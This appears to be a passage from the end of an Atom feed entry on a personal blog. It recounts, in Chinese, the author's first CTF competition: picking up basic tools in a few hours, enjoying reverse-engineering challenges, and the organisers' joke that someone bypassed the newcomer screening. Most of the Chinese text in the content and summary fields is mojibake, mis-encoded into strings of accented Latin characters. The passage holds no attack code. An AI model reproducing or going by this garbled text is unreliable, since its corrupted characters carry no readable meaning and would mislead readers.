´æ‰é–‹å§‹æŸ¥è³‡æ–™å­¸ç¿’æ€éº¼æ“ä½œä¸€äº›åŸºæœ¬å·¥å…·ï¼ŒçŸ­çŸ­6å€‹å°æ™‚æ”¶ç©«çœŸçš„æ»¿æ»¿ï¼Œç„¶å¾Œç™¼ç¾äº†Reverseçš„å¥½ç©ä¹‹è™•ï¼Œæœªä¾†æ‡‰è©²æœƒæœè‘—é€™é¡å‹é¡Œç›®å‰é€²ï¼Œå¸Œæœ›æœ‰ä¸€å¤©è§£é¡Œè¨ˆåˆ†æ¿ä¸Šé¢å¯ä»¥ç¶ æ²¹æ²¹çš„ä¸€ç‰‡w</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;äººç”Ÿç¬¬ä¸€æ¬¡åƒåŠ CTFç«¶è³½ï¼Œè½ä¸»è¾¦å–®ä½èªªé¸æ“‡é¸æ‰‹çš„æ™‚å€™å°±æ˜¯é¸æ²’æœ‰åƒåŠ éä»»ä½•æ¯”è³½çš„ï¼Œæ‰€ä»¥æ‡‰è©²éƒ½è·Ÿæˆ‘ä¸€æ¨£éƒ½æ˜¯æ–°æ‰‹å§XDï¼Œç„¶å¾Œä¸»è¾¦å–®ä½å°±èªªå¯èƒ½æœ‰äººBypassäº†ç¯©é¸æ©Ÿåˆ¶æ··é€²ä¾†äº†w&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://twinklestar03.com/categories/CTF/"/>
    
    
    <category term="CTF" scheme="https://twinklestar03.com/tags/CTF/"/>
    
    <category term="MyFirstCTF" scheme="https://twinklestar03.com/tags/MyFirstCTF/"/>
    
  </entry>
  
</feed>
